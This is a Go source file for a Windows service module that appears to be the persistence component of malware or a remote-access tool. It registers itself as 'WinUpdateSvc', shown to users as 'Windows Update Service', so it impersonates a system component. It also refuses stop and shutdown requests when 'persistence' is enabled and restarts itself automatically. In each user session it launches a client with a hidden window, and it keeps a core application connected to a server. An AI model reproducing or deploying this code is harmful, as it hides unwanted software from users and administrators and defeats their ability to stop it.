//go:build windows

package lifecycle

import (
	"bytes"
	"context"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"github.com/kardianos/service"
	"github.com/kataras/golog"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/svc"
	"golang.org/x/sys/windows/svc/mgr"
)

const (
	ServiceName        = "WinUpdateSvc"
	ServiceDisplayName = "Windows Update Service"
	ServiceDescription = "Manages Windows system updates"
)

const (
	wtsCurrentServerHandle = 0
	exitCodeStillActive    = 259
)

// windowsService implements service.Interface from kardianos/service
type windowsService struct {
	app    Application
	ctx    context.Context
	cancel context.CancelFunc
}

var (
	serviceInstallPath string

	sessionProcessMu sync.Mutex
	sessionProcesses = make(map[uint32]uint32)
)

var errNoInteractiveSession = errors.New("no interactive user sessions available")

type resilientService struct {
	app Application
}

// Start is called when the service is started
func (ws *windowsService) Start(s service.Service) error {
	golog.Info("service: Start invoked")
	ws.ctx, ws.cancel = context.WithCancel(context.Background())
	go func() {
		for {
			if ws.app != nil {
				if err := ws.app.Run(ws.ctx); err != nil && ws.ctx.Err() == nil {
					golog.Warnf("service app exit: %v", err)
				}
			}
			if ws.ctx.Err() != nil {
				return
			}
			time.Sleep(2 * time.Second)
		}
	}()
	return nil
}

// Stop is called when the service is stopped
func (ws *windowsService) Stop(s service.Service) error {
	golog.Info("service: Stop requested")
	if persistenceAllowed(serviceInstallPath) {
		golog.Info("service: stop ignored due to persistence configuration")
		return nil
	}
	if ws.cancel != nil {
		ws.cancel()
	}
	return nil
}

func getInteractiveSessionID() (uint32, error) {
	// Always enumerate all sessions to get accurate state information
	// Don't trust WTSGetActiveConsoleSessionId() alone as it may return disconnected sessions
	var sessions *windows.WTS_SESSION_INFO
	var count uint32
	if err := windows.WTSEnumerateSessions(windows.Handle(wtsCurrentServerHandle), 0, 1, &sessions, &count); err != nil {
		return 0, err
	}
	defer windows.WTSFreeMemory(uintptr(unsafe.Pointer(sessions)))

	if count == 0 {
		return 0, errNoInteractiveSession
	}

	sessionSlice := unsafe.Slice((*windows.WTS_SESSION_INFO)(unsafe.Pointer(sessions)), int(count))

	// First pass: look for active sessions only (skip disconnected)
	for _, s := range sessionSlice {
		stateName := sessionStateName(s.State)
		golog.Debugf("service: enumerated session id=%d state=%s", s.SessionID, stateName)

		// Only use WTSActive sessions, skip Disconnected
		if s.State == windows.WTSActive && s.SessionID != 0 {
			golog.Infof("service: found active session %d", s.SessionID)
			return s.SessionID, nil
		}
	}

	// Second pass: look for connected but not active sessions
	for _, s := range sessionSlice {
		if s.State == windows.WTSConnected && s.SessionID != 0 {
			golog.Infof("service: found connected session %d", s.SessionID)
			return s.SessionID, nil
		}
	}

	golog.Debug("service: no active or connected user sessions found")
	return 0, errNoInteractiveSession
}

func sessionStateName(state uint32) string {
	switch state {
	case windows.WTSActive:
		return "Active"
	case windows.WTSConnected:
		return "Connected"
	case windows.WTSConnectQuery:
		return "ConnectQuery"
	case windows.WTSShadow:
		return "Shadow"
	case windows.WTSDisconnected:
		return "Disconnected"
	case windows.WTSIdle:
		return "Idle"
	case windows.WTSListen:
		return "Listen"
	case windows.WTSReset:
		return "Reset"
	case windows.WTSDown:
		return "Down"
	case windows.WTSInit:
		return "Init"
	default:
		return fmt.Sprintf("Unknown(%d)", state)
	}
}

func recordSessionProcess(sessionID, pid uint32) {
	sessionProcessMu.Lock()
	sessionProcesses[sessionID] = pid
	sessionProcessMu.Unlock()
}

func sessionProcessRunning(sessionID uint32) bool {
	sessionProcessMu.Lock()
	pid, ok := sessionProcesses[sessionID]
	sessionProcessMu.Unlock()
	if !ok {
		return false
	}
	if processAlive(pid) {
		return true
	}
	clearSessionProcess(sessionID)
	return false
}

func clearSessionProcess(sessionID uint32) {
	sessionProcessMu.Lock()
	delete(sessionProcesses, sessionID)
	sessionProcessMu.Unlock()
}

func terminateSessionProcess(sessionID uint32) {
	sessionProcessMu.Lock()
	pid, ok := sessionProcesses[sessionID]
	sessionProcessMu.Unlock()
	if !ok {
		return
	}
	handle, err := windows.OpenProcess(windows.PROCESS_TERMINATE, false, pid)
	if err != nil {
		golog.Debugf("service: terminate session %d failed to open pid %d: %v", sessionID, pid, err)
		clearSessionProcess(sessionID)
		return
	}
	defer windows.CloseHandle(handle)
	if err := windows.TerminateProcess(handle, 0); err != nil {
		golog.Warnf("service: terminate session %d pid %d failed: %v", sessionID, pid, err)
	} else {
		golog.Infof("service: terminated session process pid=%d session=%d", pid, sessionID)
	}
	clearSessionProcess(sessionID)
}

func processAlive(pid uint32) bool {
	handle, err := windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
	if err != nil {
		return false
	}
	defer windows.CloseHandle(handle)
	var exitCode uint32
	if err := windows.GetExitCodeProcess(handle, &exitCode); err != nil {
		return false
	}
	return exitCode == exitCodeStillActive
}

func sessionEventName(eventType uint32) string {
	switch eventType {
	case windows.WTS_CONSOLE_CONNECT:
		return "ConsoleConnect"
	case windows.WTS_CONSOLE_DISCONNECT:
		return "ConsoleDisconnect"
	case windows.WTS_REMOTE_CONNECT:
		return "RemoteConnect"
	case windows.WTS_REMOTE_DISCONNECT:
		return "RemoteDisconnect"
	case windows.WTS_SESSION_LOGON:
		return "SessionLogon"
	case windows.WTS_SESSION_LOGOFF:
		return "SessionLogoff"
	case windows.WTS_SESSION_LOCK:
		return "SessionLock"
	case windows.WTS_SESSION_UNLOCK:
		return "SessionUnlock"
	case windows.WTS_SESSION_REMOTE_CONTROL:
		return "RemoteControl"
	case windows.WTS_SESSION_CREATE:
		return "SessionCreate"
	case windows.WTS_SESSION_TERMINATE:
		return "SessionTerminate"
	default:
		return fmt.Sprintf("Event(%d)", eventType)
	}
}

func shouldTerminateOnEvent(eventType uint32) bool {
	switch eventType {
	case windows.WTS_SESSION_LOGOFF, windows.WTS_SESSION_TERMINATE:
		return true
	default:
		return false
	}
}

// launchInUserSession launches the client process in the active console session (Session 1+)
func launchInUserSession(exePath string) error {
	if exePath == "" {
		exePath = serviceInstallPath
	}
	if exePath == "" {
		return errors.New("service: executable path unknown")
	}

	sessionID, err := getInteractiveSessionID()
	if err != nil {
		if errors.Is(err, errNoInteractiveSession) {
			golog.Debug("service: no interactive user session detected - deferring launch")
		} else {
			golog.Warnf("service: unable to resolve interactive session: %v", err)
		}
		return err
	}
	golog.Debugf("service: resolved interactive session id=%d", sessionID)

	if sessionProcessRunning(sessionID) {
		golog.Debugf("service: tracked client already running in session %d", sessionID)
		return nil
	}

	if isProcessRunningInSession(exePath, sessionID) {
		golog.Debugf("service: found existing client process in session %d", sessionID)
		return nil
	}

	golog.Infof("service: attempting to launch client in session %d", sessionID)

	var token windows.Token
	if err := windows.WTSQueryUserToken(sessionID, &token); err != nil {
		// ERROR_NO_TOKEN (1008) or ERROR_NO_SUCH_LOGON_SESSION (1312)
		// These indicate the session doesn't have a valid user token yet
		// This is normal for disconnected or not-fully-logged-in sessions
		errno, ok := err.(syscall.Errno)
		if ok && (errno == windows.ERROR_NO_TOKEN || errno == 1312) {
			golog.Debugf("service: session %d has no valid user token (disconnected or not logged in)", sessionID)
			return errNoInteractiveSession
		}
		golog.Warnf("service: WTSQueryUserToken failed for session %d: %v (may be disconnected)", sessionID, err)
		return errNoInteractiveSession
	}
	defer token.Close()

	var newToken windows.Token
	if err := windows.DuplicateTokenEx(
		token,
		windows.MAXIMUM_ALLOWED,
		nil,
		windows.SecurityImpersonation,
		windows.TokenPrimary,
		&newToken,
	); err != nil {
		golog.Errorf("service: DuplicateTokenEx failed for session %d: %v", sessionID, err)
		return err
	}
	defer newToken.Close()

	// Construct command line with proper Windows quoting
	// Using lpApplicationName + lpCommandLine separately ensures args are parsed correctly
	exePathUTF16, err := syscall.UTF16PtrFromString(exePath)
	if err != nil {
		golog.Errorf("service: failed to convert exe path for session %d: %v", sessionID, err)
		return err
	}

	// lpCommandLine format: "exePath" arg1 arg2
	// The first token is argv[0], subsequent tokens are arguments
	cmdLineStr := "\"" + exePath + "\" --console"
	cmdLine, err := syscall.UTF16PtrFromString(cmdLineStr)
	if err != nil {
		golog.Errorf("service: failed to build command line for session %d: %v", sessionID, err)
		return err
	}
	golog.Debugf("service: launching command: %s", cmdLineStr)

	var si windows.StartupInfo
	var pi windows.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))
	si.Desktop, _ = syscall.UTF16PtrFromString("winsta0\\default")
	si.ShowWindow = windows.SW_HIDE

	// Use lpApplicationName=exePath and lpCommandLine with full command line
	// This ensures Windows correctly parses argv[0] and argv[1]
	if err := windows.CreateProcessAsUser(
		newToken,
		exePathUTF16,  // lpApplicationName - ensures correct exe is launched
		cmdLine,       // lpCommandLine - full command line including argv[0] and --console
		nil,
		nil,
		false,
		windows.CREATE_NEW_CONSOLE|windows.NORMAL_PRIORITY_CLASS,
		nil,
		nil,
		&si,
		&pi,
	); err != nil {
		golog.Errorf("service: CreateProcessAsUser failed for session %d: %v", sessionID, err)
		return err
	}

	recordSessionProcess(sessionID, pi.ProcessId)
	golog.Infof("service: launched client pid=%d in session %d", pi.ProcessId, sessionID)

	windows.CloseHandle(pi.Process)
	windows.CloseHandle(pi.Thread)
	return nil
}

func attemptUserSessionLaunch() {
	if serviceInstallPath == "" {
		golog.Debug("service: install path unknown, skipping session launch")
		return
	}
	if err := launchInUserSession(serviceInstallPath); err != nil {
		if errors.Is(err, errNoInteractiveSession) {
			return
		}
		golog.Warnf("service: user-session launch failed: %v", err)
	}
}

func monitorUserSessions(ctx context.Context) {
	golog.Info("service: session monitor started")
	attemptUserSessionLaunch()
	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			golog.Info("service: session monitor stopping")
			return
		case <-ticker.C:
			attemptUserSessionLaunch()
		}
	}
}

// isProcessRunningInSession checks if a process is already running in the specified session
func isProcessRunningInSession(exePath string, sessionID uint32) bool {
	exeName := filepath.Base(exePath)
	if exeName == "" {
		exeName = "UpdateService.exe"
	}
	cmd := exec.Command("tasklist", "/FI", "IMAGENAME eq "+exeName, "/FI", "SESSION eq "+strconv.Itoa(int(sessionID)), "/NH")
	output, err := cmd.Output()
	if err != nil {
		golog.Warnf("tasklist check failed for session %d: %v", sessionID, err)
		return false
	}
	// If output contains the process name, it's running
	isRunning := len(output) > 0 && !bytes.Contains(output, []byte("INFO: No tasks"))
	if isRunning {
		golog.Debugf("tasklist reports %s already running in session %d", exeName, sessionID)
	}
	return isRunning
}

// Execute provides a custom SCM loop that spawns client processes in the active user session
func (rs *resilientService) Execute(args []string, r <-chan svc.ChangeRequest, changes chan<- svc.Status) (bool, uint32) {
	accepts := svc.AcceptSessionChange | svc.AcceptPowerEvent | svc.AcceptStop | svc.AcceptShutdown
	ctx, cancel := context.WithCancel(context.Background())

	golog.Info("service: Execute handler started (Session 0 watchdog)")
	golog.Infof("service: watchdog install path: %s", serviceInstallPath)

	// Start the core application in service context (Session 0)
	// This ensures connection to server even if no user sessions are available
	go func() {
		for {
			if rs.app != nil {
				golog.Info("service: Starting core application in Session 0")
				if err := rs.app.Run(ctx); err != nil && ctx.Err() == nil {
					golog.Warnf("service: core app exited: %v, restarting in 2s", err)
				}
			}
			select {
			case <-ctx.Done():
				golog.Info("service: core app shutdown requested")
				return
			case <-time.After(2 * time.Second):
			}
		}
	}()

	// Monitor user sessions and spawn UI instances when available
	go monitorUserSessions(ctx)

	changes <- svc.Status{State: svc.StartPending, Accepts: accepts}
	golog.Info("service: Sending Running status to SCM")
	changes <- svc.Status{State: svc.Running, Accepts: accepts}

	for c := range r {
		switch c.Cmd {
		case svc.Interrogate:
			golog.Debug("service: SCM interrogate request")
			changes <- c.CurrentStatus

		case svc.Stop, svc.Shutdown:
			if !persistenceAllowed(serviceInstallPath) {
				golog.Info("service: Stop request received and persistence disabled - stopping service")
				cancel()
				changes <- svc.Status{State: svc.StopPending, Accepts: accepts}
				return false, 0
			}
			golog.Info("service: Stop request received but persistence enabled - ignoring stop request")
			changes <- svc.Status{State: svc.Running, Accepts: accepts}

		case svc.SessionChange:
			sessionID := uint32(c.EventData)
			eventName := sessionEventName(c.EventType)
			golog.Infof("service: Session change detected event=%s sessionID=%d", eventName, sessionID)
			if shouldTerminateOnEvent(c.EventType) {
				terminateSessionProcess(sessionID)
			}
			go attemptUserSessionLaunch()
			changes <- c.CurrentStatus

		case svc.PowerEvent:
			golog.Infof("service: Power event received type=%d", c.EventType)
			changes <- c.CurrentStatus

		default:
			golog.Debugf("service: Unhandled SCM command=%d", c.Cmd)
			changes <- c.CurrentStatus
		}
	}

	golog.Info("service: Service control loop ended")
	cancel()
	return false, 0
}

// RunAsService runs the application as a Windows service
func RunAsService(app Application) error {
	if serviceInstallPath == "" {
		if exe, err := os.Executable(); err == nil {
			serviceInstallPath = exe
		}
	}
	isService, err := svc.IsWindowsService()
	if err != nil {
		golog.Warnf("svc.IsWindowsService failed: %v", err)
	}
	if isService {
		golog.Info("running under SCM - entering service loop")
		return svc.Run(ServiceName, &resilientService{app: app})
	}
	golog.Info("running in interactive mode, starting application directly")
	return app.Run(context.Background())
}

// WindowsServiceController implements ServiceController for Windows
type WindowsServiceController struct {
	execPath string
}

// NewServiceController creates a new Windows service controller
func NewServiceController(execPath string) *WindowsServiceController {
	if serviceInstallPath == "" {
		serviceInstallPath = execPath
	}
	return &WindowsServiceController{execPath: execPath}
}

// Install registers the service with Windows
func (w *WindowsServiceController) Install() error {
	cfg := &service.Config{
		Name:        ServiceName,
		DisplayName: ServiceDisplayName,
		Description: ServiceDescription,
		Executable:  w.execPath,
		Option: service.KeyValue{
			"StartType":                    "automatic",
			service.OnFailure:              service.OnFailureRestart,
			service.OnFailureDelayDuration: "3s",
			service.OnFailureResetPeriod:   30,
		},
	}
	svc, err := service.New(&windowsService{}, cfg)
	if err != nil {
		return err
	}
	if err := svc.Install(); err != nil {
		return err
	}
	setRecoveryActions()
	return nil
}

// Uninstall removes the service from Windows
func (w *WindowsServiceController) Uninstall() error {
	cfg := &service.Config{Name: ServiceName}
	svc, err := service.New(&windowsService{}, cfg)
	if err != nil {
		return err
	}
	return svc.Uninstall()
}

// Start starts the service
func (w *WindowsServiceController) Start() error {
	cfg := &service.Config{Name: ServiceName}
	svc, err := service.New(&windowsService{}, cfg)
	if err != nil {
		return err
	}
	return svc.Start()
}

// Stop stops the service
func (w *WindowsServiceController) Stop() error {
	if persistenceAllowed(serviceInstallPath) {
		// Intentionally ignore stop commands to keep the service running.
		return nil
	}
	cfg := &service.Config{Name: ServiceName}
	svc, err := service.New(&windowsService{}, cfg)
	if err != nil {
		return err
	}
	return svc.Stop()
}

// Status returns the current service status
func (w *WindowsServiceController) Status() (string, error) {
	cfg := &service.Config{Name: ServiceName}
	svc, err := service.New(&windowsService{}, cfg)
	if err != nil {
		return "unknown", err
	}
	status, err := svc.Status()
	if err != nil {
		return "unknown", err
	}
	switch status {
	case service.StatusRunning:
		return "running", nil
	case service.StatusStopped:
		return "stopped", nil
	default:
		return "unknown", nil
	}
}

// setRecoveryActions configures multi-step restart recovery on failure.
func setRecoveryActions() {
	m, err := mgr.Connect()
	if err != nil {
		return
	}
	defer m.Disconnect()
	s, err := m.OpenService(ServiceName)
	if err != nil {
		return
	}
	defer s.Close()
	actions := []mgr.RecoveryAction{
		{Type: mgr.ServiceRestart, Delay: 5 * time.Second},
		{Type: mgr.ServiceRestart, Delay: 10 * time.Second},
		{Type: mgr.ServiceRestart, Delay: 30 * time.Second},
	}
	_ = s.SetRecoveryActions(actions, 60)
	_ = s.SetRecoveryActionsOnNonCrashFailures(true)
}
